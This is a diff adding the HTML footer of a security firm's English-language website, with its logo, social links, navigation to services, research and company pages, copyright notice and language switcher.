+<div class="container footer">
+    <div class="logo">
+        <a href="/en/">
+            <img src="/images/logo.svg"/>
+        </a>
+        <div class="social">
+            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
+            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
+        </div>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">Services</h6>
+        <ul>
+            <li><a href="/en/services/red-team/">Red Team Assessment</a></li>
+            <li><a href="/en/services/penetration-test/">Penetration Testing</a></li>
+            <li><a href="/en/services/security-consulting/">Security Consulting</a></li>
+            <li><a href="/en/services/security-training/">Security Training</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">Research</h6>
+        <ul>
+            <li><a href="/en/research/overview/">Overview</a></li>
+            <li><a href="/en/research/awards/">Competitions and Awards</a></li>
+            <li><a href="/en/research/bug-bounty/">Enterprise Vulnerability Reports</a></li>
+            <li><a href="/en/research/talks/">International Conferences</a></li>
+            <li><a href="/en/research/cve/">CVE List</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">Company</h6>
+        <ul>
+            <li><a href="/en/company/about/">Company Overview</a></li>
+            <li><a href="/en/company/our-team/">Team Members</a></li>
+            <li><a href="/en/company/history/">Achievements</a></li>
+            <li><a href="/en/company/csr/">Corporate Social Responsibility</a></li>
+            <li><a href="/en/company/jobs/">Job Opportunities</a></li>
+            <li><a href="/en/contact/">Contact</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">News</h6>
+        <ul>
+            <li><a href="/en/blog/">Blog</a></li>
+            <li><a href="/en/media-kit/">Media Resources</a></li>
+        </ul>
+    </div>
+
+    <!-- divider 分隔線 -->
+    <div class="divider"></div>
+
+    <div class="copyright">
+        <div class="info">
+            <span>© 2023 DEVCORE <b class="line-block">All right reserved.</b></span>
+            <span><a href="/en/privacy-policy/">Privacy Policy</a></span>
+        </div>
+        <div class="lang">
+            <!-- <i class="icon translate"></i>
+            <select>
+                <option value="">Language</option>
+                <option value="">中文</option>
+                <option value="">English</option>
+            </select> -->
+            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
+        </div>
+    </div>
+
+</div>
+    </footer>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
